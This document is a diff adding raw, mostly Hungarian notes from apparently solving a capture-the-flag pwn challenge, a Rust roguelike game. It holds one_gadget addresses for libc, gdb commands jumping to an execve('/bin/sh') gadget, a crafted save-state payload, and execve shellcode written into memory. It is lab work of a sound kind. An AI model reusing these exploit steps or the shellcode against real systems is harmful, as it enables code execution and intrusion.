@@ -1,0 +1,270 @@
+egy fasza kis save state:
+66666666666666666666666666666666666666666666666610888888
+
+----------------------------------------------------------------------------
+
+> one_gadget ./lib/libc-2.33.so 
+
+0xcabfe execve("/bin/sh", r13, r12)
+constraints:
+  [r13] == NULL || r13 == NULL
+  [r12] == NULL || r12 == NULL
+
+0xcac01 execve("/bin/sh", r13, rdx)
+constraints:
+  [r13] == NULL || r13 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xcac04 execve("/bin/sh", rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+
+
+__libc_main a ghidra szerint itt van: 0x127c50, abbol valami miatt le kell venni a tejet 0x27c50
+p/x 0x00007ffff7ca0c50 - 0x27c50 + 0xcabfe
+ha ide ugrunk es r12=r13=0 akkor shellt kapunk
+jump 0x7ffff7d43bfe
+
+0xf7d43bfe11111111 = 17857964384824922385
+0x7fff = 32767
+
+
+
+p/x 0x00007ffff7ca0c50 - 0x27c50 + 0xcac01
+0xf7d43c0111111111= 17857964397709824273
+0x7fff = 32767
+
+
+----------------------
+
+itt ugrik az attackra:
+break *0x000055555556296c
+
+----------------------------------------------------------------------------
+
+
+
+
+
+(gdb) set $r12 = 0
+(gdb) set $r13= 0
+(gdb) jump 0x00007ffff7d43bfe 
+Function "0x00007ffff7d43bfe" not defined.
+(gdb) jump *0x00007ffff7d43bfe 
+Line 67 is not in `roguelike::fight'.  Jump anyway? (y or n) y
+Continuing at 0x7ffff7d43bfe.
+process 168801 is executing new program: /bin/dash
+
+
+66666666666666666666666666666666666666666666666610888888
+
+
+0xf8098bfe11111111 = 17872970519520809233
+0x7fff= 32767
+
+
+0a0000000a0000006400000000000000000000001400000000000000
+ffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+ffffffffffffffffffffffffffffffffffffffffffffffff10000000
+66666666666666666666666666666666666666666666666610888888
+ffffffff
+
+
+a linux release-be megy a call vege
+a secchall-be a teteje
+
+          secchall         linux release
+         |xxxxxxxx00000000|00000000xxxxxxxx|
+shop:           0x00005555|55561a40
+                           55561a4011111111
+                     21845|6149131203687551249
+
+                0x00005555|55561a6f
+
+10101010 20202020 30303030 40404040 50505050 60606060 70  707070
+Weapon   armor    maxhp    healing  poisions gold     ^
+strength                   potions                    01 for male, 00 female
+
+
+
+
+Maximum hit points: 1847776766
+Weapon strength: 22056
+
+ebbol a kettobol kijon valami cim amit futtat
+
+
+az enemy neve valami olyan hely kornyekere mutat ahova beirtuk a load state-et
+gdb) x/xg 0x00005555559b3c20 
+0x5555559b3c20: 0x00000005555559b3
+0x5555559b3c28: 0x00005555559b1010
+0x5555559b3c30: 0x0000000000000000
+0x5555559b3c38: 0x0000000000000051
+0x5555559b3c40: 0x00000005555559b3
+0x5555559b3c48: 0x00005555559b1010
+0x5555559b3c50: 0x3636363636363636
+0x5555559b3c58: 0x3636363636363636
+0x5555559b3c60: 0x3636363636363636
+0x5555559b3c68: 0x3636363636363636
+0x5555559b3c70: 0x3838383838383031
+0x5555559b3c78: 0x000000000000000a
+0x5555559b3c80: 0x0000000000000000
+
+
+
+https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html
+
+xor esi, esi
+push rsi
+mov rbx, 0x68732f2f6e69622f
+push rbx
+push rsp
+pop rdi
+imul esi
+mov al, 0x3b
+syscall
+
+
+char shellcode[] = "\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05";
+                           ^          ^                                                ^  ^   ^                
+66666666666666666666666666666666666666666666666610888888
+
+666610888888
+
+ 0x00005555|55561a6f
+     0x5555|559b3c50
+
+  linux:      0x559b3c5011111111 = 6168590429195407633
+  secchall:   0x5555 = 21845
+
+
+set $x = 0x5555559b3c50
+set ((long *)$x)[0] = 0x69622FBB4856F631     ; 7593684403119126065
+set ((long *)$x)[1] = 0x5F545368732F2F6E     ; 6869207039721025390
+set ((long *)$x)[2] = 0x050F3BB0EEF70000     ; 364575725949747200
+break *($x)
+
+
+(gdb) x/xg 0x7fffffffd58c+12
+AAAAAAAA -tol lefele:
+7593684403119126065
+6869207039721025390
+364575725949747200
+0
+18446697447830917393 (0xffffd59811111111)
+32767 (0x7fff)
+
+0x7fffffffd598: 0x69622fbb4856f631
+0x7fffffffd5a0: 0x5f545368732f2f6e
+0x7fffffffd5a8: 0x050f3bb0eef70000
+
+
+
+
+0x5555559b3c50: 0x6632653639363236
+0x5555559b3c58: 0x3335383633376632
+0x5555559b3c60: 0x6565376666353435
+0x5555559b3c68: 0x3530663062333062
+0x5555559b3c70: 0x3838383838383031
+
+Do you accept the djinn's offer? yes
+What is the Answer to the Ultimate Question of Life, the Universe, and Everything? 1
+How many meters does light move in a year? 2
+What is the best number? 3
+What is the 19th happy prime? 4
+What is the order of the Lyons group? 5
+Sum all natural numbers; take the reciprocal, then multiply it by -1. What do you get? 6
+What is the reciprocal of the fine structure constant? 7
+AAAAAAAA (hint: https://www.youtube.com/watch?v=bknybcgfjAk)? 8
+What was the Unix timestamp when this challenge was developed? 9
+When did Richard Stallman started the GNU project? 10
+How many times does the unsafe keyword appear in the source code of the Rust standard library's source code? 11
+When was the first version of Linux released? 12
+How many challenges remained unsolved during last year's SecChallenge? 13
+What is the closest even prime to 23400? 14
+3↑↑3 = ? 15
+The djinn starts to speak some weird language. You feel your life force leaving your body. You feel barely alive when the djinn stops casting the spell.
+The djinn disappears in a puff of smoke; you will never see him again.
+
+Your enemy is called 
+
+Maximum hit points: 11
+Weapon strength: 0
+Armor: 12
+
+It is your turn. Choose one:
+1: Attack
+2: Defend (increase your armor by 10 for one turn)
+3: Drink healing potion
+4: Throw poison at enemy
+> 2
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000d00000000 in ?? ()
+                  
+
+
+10101010 20202020 30303030 40404040 50505050 60606060 70707070
+Weapon   armor    maxhp    healing  poisions gold
+strength                   potions  
+0a0000000a0000006400000000000000000000001400000000000000
+
+
+   0x00005555555635c9 <+377>:   callq  *0x81b19(%rip)        # 0x5555555e50e8
+=> 0x00005555555635cf <+383>:   add    $0xd8,%rsp
+   0x00005555555635d6 <+390>:   retq   
+   0x00005555555635d7 <+391>:   lea    0x63222(%rip),%rdi        # 0x5555555c6800 <str.1>
+   0x00005555555635de <+398>:   lea    0x7b9db(%rip),%rdx        # 0x5555555defc0
+   0x00005555555635e5 <+405>:   lea    0x5c464(%rip),%rax        # 0x5555555bfa50 <core::panicking::panic>
+   0x00005555555635ec <+412>:   mov    $0x1c,%esi
+   0x00005555555635f1 <+417>:   callq  *%rax
+   0x00005555555635f3 <+419>:   ud2    
+   0x00005555555635f5 <+421>:   lea    0x631a4(%rip),%rdi        # 0x5555555c67a0 <str.0>
+   0x00005555555635fc <+428>:   lea    0x7b9d5(%rip),%rdx        # 0x5555555defd8
+   0x0000555555563603 <+435>:   lea    0x5c446(%rip),%rax        # 0x5555555bfa50 <core::panicking::panic>
+   0x000055555556360a <+442>:   mov    $0x21,%esi
+   0x000055555556360f <+447>:   callq  *%rax
+   0x0000555555563611 <+449>:   ud2    
+End of assembler dump.
+(gdb) stepi
+0x00005555555635d6 in roguelike::plain_attack_player (state=0x1, player=0x7fffffffd5ac, 
+    enemy=0x5555555c4500 <core::fmt::num::imp::<impl core::fmt::Display for u32>::fmt>)
+    at /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs:460
+460     in /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs
+(gdb) stepi
+roguelike::player_attack (state=0x7fffffffd5c0, player=0x7fffffffd9a0, enemy=0x7fffffffd590)
+    at /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs:397
+397     in /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs
+(gdb) 
+434     in /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs
+(gdb) 
+0x0000555555563296 in roguelike::player_attack (state=0x7fffff7fe000, player=0x5555555c64f8, enemy=0x0)
+    at /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs:434
+434     in /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs
+(gdb) 
+roguelike::fight (player=0x7fffffffd9a0)
+    at /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs:332
+332     in /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs
+(gdb) 
+0x00005555555627d6      332     in /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs
+(gdb) 
+0x00005555555627d8      332     in /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs
+(gdb) 
+330     in /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs
+(gdb) 
+346     in /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs
+(gdb) 
+0x0000555555562952      346     in /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs
+(gdb) 
+357     in /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs
+(gdb) 
+0x000055555556295c      357     in /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs
+(gdb) 
+0x0000555555562964      357     in /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs
+(gdb) 
+0x000055555556296c      357     in /home/marci/core/secchallenge21/secchallenge21-pwn-3/roguelike/src/main.rs
+(gdb) 
+0x0000000100005555 in ?? ()
+(gdb) 
+
